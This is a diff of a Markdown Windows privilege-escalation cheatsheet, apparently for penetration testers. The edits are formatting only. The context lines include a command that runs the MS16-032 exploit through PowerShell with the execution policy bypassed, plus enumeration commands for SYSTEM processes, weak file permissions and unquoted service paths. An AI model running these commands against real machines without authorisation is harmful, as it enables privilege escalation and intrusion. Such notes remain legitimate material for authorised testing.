@@ -277,17 +277,16 @@ $ net users Administrator
 	C:\tmp>powershell -ExecutionPolicy ByPass -command "& { . C:\tmp\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
 	```
 - Processes Running as system
-	* *Do not gloss over! IMPORTANT*
+	* ***Do not gloss over! IMPORTANT***
 	```systemprocesses
 	tasklist /v /fi "username eq system"
 	```
 - Check Weak File Permissions 
+* [More commands](http://www.exumbraops.com/penetration-testing-102-windows-privilege-escalation-cheatsheet)
 ```
-
 accesschk.exe -uwcqv "Authenticated Users" * /accepteula
 accesschk.exe -uwcqv "Authenticated Users" C:\*.* /accepteula
 ```
-	* [More commands](http://www.exumbraops.com/penetration-testing-102-windows-privilege-escalation-cheatsheet)
 - [Unquoted Service Path](https://pentestlab.blog/2017/03/09/unquoted-service-path/)
 	```unquoted
 	wmic service get name,displayname,pathname,startmode |findstr /i “auto” |findstr /i /v “c:\windows\\” |findstr /i /v “””
